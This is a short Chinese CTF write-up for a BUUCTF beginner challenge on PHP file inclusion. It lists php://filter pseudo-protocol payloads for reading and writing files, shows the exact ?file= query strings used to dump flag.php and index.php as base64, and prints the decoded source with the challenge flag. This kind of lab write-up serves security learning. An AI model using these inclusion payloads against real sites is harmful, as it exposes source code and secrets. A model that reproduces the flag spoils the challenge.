<center>新生赛Include1</center>

[toc]







## 新生赛Include1

> 赛题 [buuctf](https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Include)



### 1.讲解

> 主要看url可以看出文件包含相关
>
> 因为文件包含有一个特性，就是对于被包含的文件，`代码会直接执行`，不会显示，而非代码会直接显示出来，所以，对于这样的情况，我们可以把文件编码为不可以被执行的内容，就可以直接显示出来了，



### 2. 伪协议

> [php伪协议](https://blog.csdn.net/qq_51295677/article/details/123462929) 遇到文件包含需要读取源码可以使用php://filter协议，格式如下 

```shell
读：php://filter/resource=文件名
    # base64 加密读
php://filter/read=convert.base64-encode/resource=文件名
 
写：php://filter/resource=文件名&txt=文件内容
 
php://filter/write=convert.base64-encode/resource=文件名&txt=文件内容
```



### 3.使用

> base64[base64](https://blog.csdn.net/wo541075754/article/details/81734770)在线编码  [在线base64](https://base64.us/)

```shell
# flag的源码
?file=php://filter/read=convert.base64-encode/resource=flag.php
?file=php://filter/read=convert.base64-encode/resource=index.php
```

> 通过base64解码出来就可以看到我们网址的源码了

```js
<?php
echo "Can you find out the flag?";
//flag{95d98028-64e5-4be3-8255-80285f0ba5dc}
```





### top 看到的网址 后面会整理到环境搭建篇

```shell
ctfer : https://book.nu1l.com/
```



